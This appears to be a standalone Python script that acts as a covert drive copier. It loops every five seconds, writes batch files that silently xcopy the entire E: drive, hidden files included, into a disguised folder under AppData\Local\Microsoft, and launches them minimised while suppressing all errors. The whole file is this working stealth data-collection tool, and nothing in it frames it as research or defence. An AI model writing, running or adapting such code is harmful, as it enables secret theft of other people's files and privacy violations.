import os
import subprocess
import getpass
import time

while True:
    file_path = os.path.dirname(os.path.realpath(__file__))
    time.sleep(5)
    try:
        with open(file_path +"\\" +'cd.bat', "w+") as cd_file:
            cd_file.write(r'xcopy E:\ C:\Users\%s\AppData\Local\Microsoft\FileIn\ /Y /H /G /Q /C /I /E' % getpass.getuser())
        with open(file_path +"\\" +'cd2.bat', "w+") as cd2_file:
            cd2_file.write('start /min cmd /c '+ file_path +'\cd.bat')
        subprocess.call(file_path+"\cd2.bat")
    except:
        pass
